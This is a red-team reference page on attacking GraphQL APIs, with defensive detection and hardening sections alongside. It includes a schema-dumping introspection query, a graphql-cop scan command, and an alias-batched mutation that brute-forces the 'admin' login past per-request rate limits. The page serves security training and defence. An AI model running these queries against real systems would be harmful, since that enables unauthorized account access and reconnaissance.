---
title: "GraphQL attacks"
category: "red-team"
tags: ["web", "graphql", "api", "injection"]
platform: "web"
mitre: ["T1190"]
difficulty: "intermediate"
updated: "2026-07-12"
author: "core"
---

# GraphQL attacks

## TL;DR
GraphQL's flexibility is its attack surface: introspection reveals the whole schema, nested queries cause DoS, and per-resolver authorization gaps enable IDOR/BOLA. Offensive counterpart to [appsec/api-security/graphql-security](../../appsec/api-security/graphql-security.md).

## Recon
```graphql
# Introspection – dump the entire schema (types, fields, mutations)
{ __schema { types { name fields { name } } queryType { name } mutationType { name } } }
```
```bash
# Tools
graphql-cop -t https://target/graphql        # common misconfig checks
# clairvoyance – reconstruct schema even when introspection is disabled
# InQL (Burp extension) – schema parsing + query generation
```

## Attacks
```text
Introspection abuse   – map the schema -> find hidden/admin fields & mutations.
BOLA/IDOR             – query node(id:) / user(id:) for objects you don't own (authz per resolver).
Deep/nested queries   – recursive relations -> resource exhaustion DoS.
Batching / aliasing   – many operations in one request -> bypass rate limits / brute force:
                        { a: login(pw:"1") b: login(pw:"2") ... }  (alias-based brute force)
Injection             – SQLi/NoSQLi through resolver arguments into the backend.
Info disclosure       – verbose errors, field suggestions ("Did you mean...").
```

## Example: alias-based brute force (bypasses per-request rate limits)
```graphql
mutation {
  a: login(user:"admin", pass:"p1") { token }
  b: login(user:"admin", pass:"p2") { token }
  c: login(user:"admin", pass:"p3") { token }
}
```

## Detection (Blue Team)
- Introspection queries in prod; abnormally deep/large queries; many aliases per request.
- High operation counts per request (batching abuse); resolver errors leaking schema.

## Mitigation / Hardening
- Disable introspection in prod; use persisted (allow-listed) queries.
- Query depth + complexity limits, timeouts, and disable batching or cap it.
- **Authorize per resolver/field** (not just at the gateway); generic errors.
- Rate limit accounting for aliases/batches. See [owasp-api-top10](../../appsec/api-security/owasp-api-top10.md).

## Sources
- [OWASP – GraphQL CS](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html) · [graphql-cop](https://github.com/dolevf/graphql-cop)
